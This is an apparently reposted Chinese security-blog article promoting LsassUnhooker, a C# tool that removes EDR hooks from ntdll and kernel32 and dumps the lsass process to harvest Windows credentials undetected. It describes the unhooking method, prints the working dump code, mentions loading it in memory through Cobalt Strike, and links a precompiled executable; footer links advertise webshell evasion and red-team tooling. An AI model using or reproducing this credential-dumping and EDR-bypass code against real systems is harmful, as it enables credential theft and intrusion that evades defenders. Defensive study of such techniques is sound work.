<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Ucm3XQm9m4kzVzdaHIUn9Q)

**LsassUnhooker**

用C#编写的小程序可以绕过EDR钩子并转储lsass进程的内容，框架：.NET Framework 4，可以用CobaltStrike execute-assembly加载内存执行，集成至CS插件。  

  

**LsassUnhooker**项目地址：****

https://github.com/roberreigada/LsassUnhooker

  

**SharpUnhooker项目地址：**

https://github.com/GetRektBoy724/SharpUnhooker

  

该代码使用SharpUnhooker项目，由@GetRektBoy724创建，工作方式如下：

1.  它使用“PE parser stuff”读取并复制.text section原始（磁盘中）DLL
    
2.  它使用和从D/Invoke修补.text section加载的DLL（以更改内存的权限）Marshal.Copy、NtProtectVirtualMemory
    
3.  它通过再次读取来检查修补的内存中 DLL，并将其与原始 DLL 进行比较，以查看其是否正确修补。
    

  

通过使用SharpUnhooker和MiniDumpWriteDump函数，我能够绕过多个EDR并设法在不被发现的情况下转储lsass的内容，这是解决问题的代码：

```
`SilentUnhooker("ntdll.dll");``SilentUnhooker("kernel32.dll");``String dumpFileName = Directory.GetCurrentDirectory() + "\\" + "lsass.dmp";``if (System.IO.File.Exists(dumpFileName))``{` `System.IO.File.Delete(dumpFileName);``}``IntPtr hFile = NativeMethods.CreateFile(dumpFileName, NativeMethods.EFileAccess.GenericWrite, NativeMethods.EFileShare.None, lpSecurityAttributes: IntPtr.Zero, dwCreationDisposition: NativeMethods.ECreationDisposition.CreateAlways, dwFlagsAndAttributes: NativeMethods.EFileAttributes.Normal, hTemplateFile: IntPtr.Zero);``NativeMethods._MINIDUMP_TYPE dumpType = NativeMethods._MINIDUMP_TYPE.MiniDumpWithFullMemory;``var proc = Process.GetProcessesByName("lsass").FirstOrDefault();``var exceptInfo = new NativeMethods.MINIDUMP_EXCEPTION_INFORMATION();``var result = NativeMethods.MiniDumpWriteDump(proc.Handle, proc.Id, hFile, dumpType, ref exceptInfo, UserStreamParam: IntPtr.Zero, CallbackParam: IntPtr.Zero);``if (result == true) {` `Console.WriteLine("lsass process was successfully dumped in " + Directory.GetCurrentDirectory() + "\\" + "lsass.dmp");``}``else {` `Console.WriteLine("Error dumping lsass process");``}`
```

已经编译好的LsassUnhooker.exe文件：

链接：https://pan.baidu.com/s/1VaqGK-FnyvsveN3hrz5XwA

提取码：z78j

  

来源于：Hack分享吧

如有侵权，请联系删除

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

好文推荐

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

[工具|红队快速批量打点](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247501726&idx=1&sn=7340d2d736b8b675044fcd027734edfa&chksm=c30814eef47f9df8c5b0b3bdec2c7ee32719efb8ac421fd7f100f801553c760a8544dfa9e5eb&scene=21#wechat_redirect)

[实战 | App优惠劵无限领取漏洞挖掘记录](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247501691&idx=1&sn=a85286aa98162257c6bd27c580958149&chksm=c308140bf47f9d1dcd77fee53ea5bc33dd2e4a51d49128bc4e250a2b9de871b4b38ad0b9c352&scene=21#wechat_redirect)  

[利用 EHole 进行红队快速批量打点](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247501551&idx=1&sn=def3dc507ccf0db02d6bbbef1bcc607c&chksm=c308159ff47f9c894fb9f4e377e5932dbdd4c23b2cc1174327f7ac75ef3418a20a97a7a35f8c&scene=21#wechat_redirect)  

[神兵利器 - presshell](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247501226&idx=1&sn=58c19eb68666549b7a762e0884b50614&chksm=c30816daf47f9fcc70a684e98595e7e3815b7466f53e89fd133367cd3b8bc3433c39c44205ad&scene=21#wechat_redirect)  

[渗透测试-Ngrok内网映射与穿透](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247501189&idx=1&sn=eef208ca1b4148b21252714c4406ee1a&chksm=c30816f5f47f9fe31d55282360f6005ca294fdc651913436e6b80799c4e6b70d943c7c0bc2c6&scene=21#wechat_redirect)  

[分享 | 几种实战成功过的webshell免杀方式](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247501226&idx=2&sn=54fac5717f8d7198961846c04527deee&chksm=c30816daf47f9fcc33673cc2b8080a4b7a1d54c8f22ba623cb60514173bd1dc7564fa52e781b&scene=21#wechat_redirect)  

[推荐一款自动向hackerone发送漏洞报告的扫描器](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247501261&idx=1&sn=0ac4d45935842842f32c7936f552ee21&chksm=c30816bdf47f9fab5900c9bfd6cea7b1d99cd32b65baec8006c244f9041b25d080b2f23fd2c1&scene=21#wechat_redirect)  

[李姐姐开源DNSLog工具eyes.sh](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247501334&idx=1&sn=c6469632a877719433b4144656b0c2d8&chksm=c3081566f47f9c70595486954a92757fe6b0ea2d812650420cdccc8d3170b5135f5e3d303728&scene=21#wechat_redirect)  

  

**欢迎关注 系统安全运维**

 ![](http://mmbiz.qpic.cn/mmbiz_png/m41BLSafyI5Hhs9CtEc9atTYUNrfH9zfLGicoHntIkIex17H7tPq294ufnMXwkwrFwqJ0rJGia2Eo16J8XcgxJDg/0?wx_fmt=png) ** 系统安全运维 ** 未知攻 焉知防 攻防兼备 16篇原创内容   公众号